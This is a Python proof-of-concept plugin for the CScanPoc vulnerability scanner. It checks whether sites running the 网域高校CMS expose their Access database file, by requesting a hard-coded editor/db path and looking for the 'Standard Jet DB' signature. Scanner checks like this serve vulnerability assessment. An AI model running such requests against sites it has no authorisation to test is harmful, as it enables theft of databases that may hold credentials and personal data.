# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re, urlparse

class Vuln(ABVuln):
    vuln_id = 'WYGXCMS_0002'  # 平台漏洞编号，留空
    name = '网域高校CMS数据库任意下载'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD # 漏洞类型
    disclosure_date = '2014-11-03'  # 漏洞公布时间
    desc = '''
        网域高校CMS数据库任意下载。
        /editor/db/%23%23%23wygk20012%23%23%23editor.mdb
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = '网域高校CMS'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'd74cd1c1-244a-4ebb-abeb-de11ea80fa1a'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-27'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            #Refer:http://www.wooyun.org/bugs/wooyun-2010-067890
            hh = hackhttp.hackhttp()
            arg = self.target
            url = arg + "/editor/db/%23%23%23wygk20012%23%23%23editor.mdb"
            code, head, res, errcode, _ = hh.http(url)

            if code == 200 and "Standard Jet DB" in res:
                #security_hole('file download Vulnerable:'+url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()